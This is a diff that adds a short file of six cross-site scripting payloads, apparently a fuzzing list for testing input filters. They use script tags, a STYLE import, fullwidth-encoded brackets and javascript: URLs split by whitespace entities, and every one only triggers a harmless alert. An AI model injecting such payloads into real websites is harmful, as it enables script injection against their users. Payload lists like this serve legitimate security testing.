@@ -1,0 +1,6 @@
+>"><script>alert("chipotle")</script>&
+"><STYLE>@import"javascript:alert('chipotle')";</STYLE>
+'%uff1cscript%uff1ealert('chipotle')%uff1c/script%uff1e'
+<IMG SRC="jav&#x09;ascript:alert(<WBR>'chipotle');">
+<IMG SRC="jav&#x0A;ascript:alert(<WBR>'chipotle');">
+<IMG SRC="jav&#x0D;ascript:alert(<WBR>'chipotle');">
